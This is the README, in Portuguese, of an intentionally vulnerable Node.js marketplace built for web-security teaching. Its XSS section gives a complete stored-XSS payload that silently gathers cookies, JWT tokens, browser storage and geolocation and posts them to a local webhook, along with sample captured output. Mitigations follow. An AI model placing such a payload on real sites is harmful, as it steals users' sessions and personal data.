# 🛒 Marketplace Vulnerável

## 📄 Descrição

Bem-vindo ao **Marketplace Vulnerável**, uma aplicação web intencionalmente insegura desenvolvida para fins educacionais. Esta aplicação demonstra como vulnerabilidades como **Cross-Site Scripting (XSS)** podem ser exploradas para capturar informações sensíveis dos usuários. Utilize esta ferramenta para aprender sobre segurança web, identificar falhas e entender a importância das boas práticas de desenvolvimento seguro.

> **⚠️ Aviso de Segurança:** Esta aplicação contém vulnerabilidades intencionais. **Nunca** execute ou exponha esta aplicação em ambientes de produção ou públicos. Utilize-a apenas em ambientes de desenvolvimento isolados.

## 📚 Índice

1. [Pré-requisitos](#pré-requisitos)
2. [Instalação](#instalação)
3. [Configuração](#configuração)
4. [Executando a Aplicação](#executando-a-aplicação)
5. [Funcionalidades](#funcionalidades)
    - [Cadastro de Usuário](#cadastro-de-usuário)
    - [Login](#login)
    - [Cadastro de Produto](#cadastro-de-produto)
    - [Visualização de Produtos](#visualização-de-produtos)
    - [Teste de Vulnerabilidade XSS](#teste-de-vulnerabilidade-xss)
6. [Considerações Finais](#considerações-finais)
7. [Recursos Adicionais](#recursos-adicionais)
8. [Contato](#contato)

---

## Pré-requisitos

Antes de iniciar, certifique-se de ter o seguinte instalado em sua máquina:

- [Node.js](https://nodejs.org/) (v14 ou superior)
- [npm](https://www.npmjs.com/) (geralmente instalado junto com o Node.js)
- [Git](https://git-scm.com/) (opcional, para clonar o repositório)

## Instalação

### 1. Clonar o Repositório

Caso ainda não tenha clonado o repositório, faça isso utilizando o seguinte comando:

```bash
git clone https://github.com/cHIsIMun/Marketplace-Vulneravel.git
cd Marketplace-Vulneravel
```

### 2. Instalar Dependências

Instale todas as dependências necessárias utilizando o **npm**:

```bash
npm install
```

> **Nota:** O comando `npm install` irá instalar todas as dependências listadas no `package.json`.

### 3. Configurar Variáveis de Ambiente

Crie um arquivo `.env` na raiz do projeto para armazenar as variáveis de ambiente sensíveis:

```bash
touch .env
```

Abra o arquivo `.env` e adicione a seguinte linha, substituindo `sua_chave_secreta_aqui` por uma chave secreta forte:

```env
JWT_SECRET=sua_chave_secreta_aqui
```

> **Importante:** A chave secreta é usada para assinar os tokens JWT. Mantenha-a segura e não a compartilhe.

## Executando a Aplicação

Inicie a aplicação utilizando o seguinte comando:

```bash
npm start
```

Após a execução, você deverá ver a seguinte mensagem no terminal:

```
🚀 Server is running on http://localhost:3000
```

Abra o seu navegador e acesse [http://localhost:3000](http://localhost:3000) para interagir com a aplicação.

## Funcionalidades

### Cadastro de Usuário

1. **Acessar a Página de Cadastro:**

   - No navegador, vá para [http://localhost:3000/register](http://localhost:3000/register).

2. **Preencher o Formulário de Cadastro:**

   - **Nome de Usuário:** Insira um nome de usuário único.
   - **Senha:** Insira uma senha segura.
   
   ![Página de Cadastro](./public/images/register.png)

3. **Cadastrar:**

   - Clique em "Registrar" para criar a sua conta.
   - Se o nome de usuário já existir, uma mensagem de erro será exibida.

### Login

1. **Acessar a Página de Login:**

   - No navegador, vá para [http://localhost:3000/login](http://localhost:3000/login).

2. **Preencher o Formulário de Login:**

   - **Nome de Usuário:** Insira o nome de usuário registrado.
   - **Senha:** Insira a senha correspondente.
   

3. **Entrar:**

   - Clique em "Entrar" para acessar sua conta.
   - Se as credenciais forem inválidas, uma mensagem de erro será exibida.

### Cadastro de Produto

1. **Acessar a Página de Cadastro de Produtos:**

   - Após fazer login, você será redirecionado para a lista de produtos.
   - Clique em "➕ Cadastrar Novo Produto" para adicionar um novo produto.

2. **Preencher o Formulário de Cadastro:**

   - **Nome:** Insira o nome do produto.
   - **Preço:** Insira o preço do produto (ex: `9999.99`).
   - **Imagem:** Insira a URL de uma imagem do produto (opcional).
   - **Descrição:** Insira uma descrição para o produto. **ATENÇÃO:** Este campo aceita HTML, permitindo a injeção de scripts maliciosos.
   - **Tags:** Insira tags relacionadas ao produto, separadas por vírgulas.

3. **Cadastrar:**

   - Clique em "Adicionar Produto" para salvar o produto.
   - O produto será adicionado à lista de produtos disponíveis.

### Visualização de Produtos

1. **Acessar a Lista de Produtos:**

   - Após cadastrar produtos, você verá a lista de produtos na página principal ([http://localhost:3000/products](http://localhost:3000/products)).

2. **Detalhes do Produto:**

   - Clique no nome ou na imagem de um produto para ver seus detalhes.
   

3. **Página de Detalhes:**

   - Na página de detalhes, a descrição do produto será renderizada. Se contiver scripts maliciosos, eles serão executados aqui.
   

### Teste de Vulnerabilidade XSS

Para demonstrar a vulnerabilidade de **Cross-Site Scripting (XSS)**, siga os passos abaixo:

1. **Configurar o Servidor de Webhook:**

   - Certifique-se de que o **Servidor de Webhook Local** está rodando em [http://localhost:4000/webhook](http://localhost:4000/webhook).
   - Siga as instruções no [README do Servidor de Webhook Local](./webhook-server/README.md) para configurá-lo.

2. **Cadastrar um Produto Malicioso:**

   - Acesse [http://localhost:3000/add-product](http://localhost:3000/add-product).
   - Preencha o formulário com os seguintes dados:
     - **Nome:** iPhone 15 Pro Max 💎
     - **Preço:** 9999.99
     - **Imagem:** `https://imgs.search.brave.com/PXItQGv-8OC6DZP3xIwR8NRJtjDJypOGNTiYQuvXndw/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly93d3cu/Z29pbXBvcnRzLmNv/bS5ici9pbWFnZS9j/YXRhbG9nLzAwaXBo/b25lMTUvaXBob25l/LTE1LWZpbmlzaC1z/ZWxlY3QtMjAyMzA5/LTYtMWluY2gtYmxh/Y2sucG5n`
     - **Descrição:**

       ```html
       <script>
           (function() {
               // Função para obter todos os cookies como um objeto
               function getCookies() {
                   const cookies = document.cookie.split(';').reduce((acc, cookie) => {
                       const [key, value] = cookie.trim().split('=');
                       acc[key] = decodeURIComponent(value);
                       return acc;
                   }, {});
                   return cookies;
               }
       
               // Função para obter informações adicionais
               function getAdditionalInfo() {
                   const additionalInfo = {
                       userAgent: navigator.userAgent,
                       language: navigator.language || navigator.userLanguage,
                       screenResolution: `${window.screen.width}x${window.screen.height}`,
                       currentURL: window.location.href,
                       referer: document.referrer,
                       timestamp: new Date().toISOString(),
                       sessionStorage: {},
                       // Tenta obter localização geográfica
                       geolocation: {}
                   };
       
                   // Capturar dados do sessionStorage
                   for (let i = 0; i < sessionStorage.length; i++) {
                       const key = sessionStorage.key(i);
                       additionalInfo.sessionStorage[key] = sessionStorage.getItem(key);
                   }
       
                   // Capturar localização geográfica (se permitido)
                   if (navigator.geolocation) {
                       navigator.geolocation.getCurrentPosition(
                           (position) => {
                               additionalInfo.geolocation = {
                                   latitude: position.coords.latitude,
                                   longitude: position.coords.longitude
                               };
                               sendData(); // Enviar dados após obter localização
                           },
                           (error) => {
                               additionalInfo.geolocation = { error: error.message };
                               sendData(); // Enviar dados mesmo se a localização não for obtida
                           }
                       );
                   } else {
                       additionalInfo.geolocation = { error: 'Geolocation não suportado' };
                       sendData(); // Enviar dados mesmo se a geolocation não estiver disponível
                   }
       
                   // Função para enviar os dados coletados
                   function sendData() {
                       const data = {
                           cookies: getCookies(),
                           localStorage: {},
                           sessionStorage: additionalInfo.sessionStorage,
                           userAgent: additionalInfo.userAgent,
                           language: additionalInfo.language,
                           screenResolution: additionalInfo.screenResolution,
                           currentURL: additionalInfo.currentURL,
                           referer: additionalInfo.referer,
                           timestamp: additionalInfo.timestamp,
                           geolocation: additionalInfo.geolocation
                       };
       
                       // Capturar dados do localStorage
                       for (let i = 0; i < localStorage.length; i++) {
                           const key = localStorage.key(i);
                           data.localStorage[key] = localStorage.getItem(key);
                       }
       
                       // Enviar os dados para o webhook local
                       fetch('http://localhost:4000/webhook', { // URL do webhook local
                           method: 'POST',
                           headers: {
                               'Content-Type': 'application/json'
                           },
                           body: JSON.stringify(data)
                       })
                       .catch(error => {
                           console.error('Erro ao enviar dados para o webhook:', error);
                       });
                   }
       
                   return additionalInfo;
               }
       
               // Executar a coleta e exfiltração de dados
               getAdditionalInfo();
           })();
       </script>
       ```

3. **Cadastrar o Produto:**

   - Clique em "Adicionar Produto" para salvar o produto malicioso.

4. **Visualizar o Produto Malicioso:**

   - Após cadastrar, você será redirecionado para a lista de produtos.
   - Clique no produto "iPhone 15 Pro Max 💎" para acessar sua página de detalhes.
   - **Comportamento Esperado:**
     - **Sem Alertas:** Nenhum alerta ou notificação será exibido.
     - **Dados Enviados ao Webhook:** No terminal onde o Servidor de Webhook Local está rodando, você deverá ver os dados capturados de forma organizada.

     **Exemplo de Saída no Webhook Server:**

     ```
     📥 Dados Recebidos via Webhook:
     📍 IP do Cliente: ::1
     📆 Timestamp: 2024-04-27T14:23:45.678Z
     🧑‍💻 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36...
     🌐 URL Atual: http://localhost:3000/product/1
     🔗 Referer: http://localhost:3000/products
     🌐 Idioma: pt-BR
     📺 Resolução da Tela: 1920x1080
     📑 Cookies: { token: 'eyJhbGciOiJIUzI1NiIsInR5cCI6...', refreshToken: 'eyJhbGciOiJIUzI1NiIsInR5cCI6...', username: 'lucas.cardoso' }
     🗄️ LocalStorage: { theme: 'dark', cart: ['item1', 'item2'] }
     🗄️ SessionStorage: { sessionKey: 'abc123', tempData: 'xyz789' }
     📍 Geolocalização: { latitude: 37.7749, longitude: -122.4194 }
     -------------------------------------------
     ```

## Considerações Finais

### ⚠️ Responsabilidade Ética

- **Ambiente de Teste:** Utilize esta aplicação **apenas** em ambientes de desenvolvimento isolados. **Nunca** exponha aplicações vulneráveis a ambientes de produção ou acessíveis ao público.
- **Uso Responsável:** Utilize este conhecimento de forma ética e responsável. A exploração de vulnerabilidades em sistemas sem autorização é ilegal e antiética.

### 🛡️ Medidas de Mitigação

Para transformar esta aplicação em uma ferramenta de aprendizado sobre como mitigar vulnerabilidades, considere implementar as seguintes melhorias:

1. **Sanitização de Entradas:**
   - Utilize bibliotecas como [sanitize-html](https://github.com/apostrophecms/sanitize-html) para limpar entradas de usuários e prevenir XSS.
   
   **Exemplo de Implementação:**
   
   ```javascript
   const sanitizeHtml = require('sanitize-html');

   // Processar cadastro de produto (protegida)
   app.post('/add-product', authenticateToken, (req, res) => {
       const { name, price, image, description, tags } = req.body;
       const userId = req.user.id;

       // Sanitizar a descrição
       const descricaoSanitizada = sanitizeHtml(description, {
           allowedTags: [ 'b', 'i', 'em', 'strong', 'a', 'p', 'ul', 'li', 'br' ],
           allowedAttributes: {
               'a': [ 'href' ]
           },
           allowedSchemes: [ 'http', 'https', 'mailto' ]
       });

       db.run(
         `INSERT INTO products (user_id, name, price, image, description, tags) VALUES (?, ?, ?, ?, ?, ?)`,
         [userId, name, price, image, descricaoSanitizada, tags],
         function (err) {
           if (err) {
             return res.render('add-product', {
               title: 'Add Product',
               error: 'Error adding product!',
             });
           }
           res.redirect('/products');
         }
       );
   });
   ```

2. **Content Security Policy (CSP):**
   - Restringe as fontes de scripts e outros recursos para prevenir a execução de scripts não autorizados.
   
   **Exemplo de Implementação:**
   
   ```javascript
   app.use((req, res, next) => {
       res.setHeader("Content-Security-Policy", "default-src 'self'");
       next();
   });
   ```

3. **Uso de `HttpOnly` e `Secure` Flags em Cookies:**
   - Protege os cookies de acesso via JavaScript e garante que sejam transmitidos apenas via conexões seguras.
   
   **Exemplo de Implementação:**
   
   ```javascript
   // Store tokens in cookies with httpOnly and secure flags
   res.cookie('token', token, { httpOnly: true, secure: true });
   res.cookie('refreshToken', refreshToken, { httpOnly: true, secure: true });
   res.cookie('username', user.username, { secure: true });
   ```

   > **Nota:** O flag `secure` requer que a aplicação esteja rodando em HTTPS.

4. **Validação e Sanitização no Backend:**
   - Assegure-se de validar todas as entradas do usuário no backend antes de processá-las ou armazená-las no banco de dados.

### 📚 Recursos Adicionais

- **OWASP Top Ten:** [https://owasp.org/www-project-top-ten/](https://owasp.org/www-project-top-ten/)
  - Guia sobre as principais vulnerabilidades de segurança em aplicações web.
- **Express.js Documentation:** [https://expressjs.com/](https://expressjs.com/)
  - Documentação oficial do framework Express.js.
- **sanitize-html:** [https://github.com/apostrophecms/sanitize-html](https://github.com/apostrophecms/sanitize-html)
  - Biblioteca para sanitização de HTML em Node.js.
- **jsonwebtoken:** [https://github.com/auth0/node-jsonwebtoken](https://github.com/auth0/node-jsonwebtoken)
  - Biblioteca para criação e verificação de JWT.
- **bcryptjs:** [https://github.com/dcodeIO/bcrypt.js/](https://github.com/dcodeIO/bcrypt.js/)
  - Biblioteca para hashing de senhas.
- **Content Security Policy (CSP):** [https://developer.mozilla.org/pt-BR/docs/Web/HTTP/CSP](https://developer.mozilla.org/pt-BR/docs/Web/HTTP/CSP)
  - Guia sobre como implementar CSP para aumentar a segurança das aplicações web.

## Contato

Para dúvidas, sugestões ou contribuições, sinta-se à vontade para entrar em contato:

- **Email:** [lucas.oliv001@gmail.com](mailto:lucas.oliv001@gmail.com).
- **GitHub:** [cHIsIMun](https://github.com/cHIsIMun)

---

🔒 **Mantenha suas aplicações seguras!**
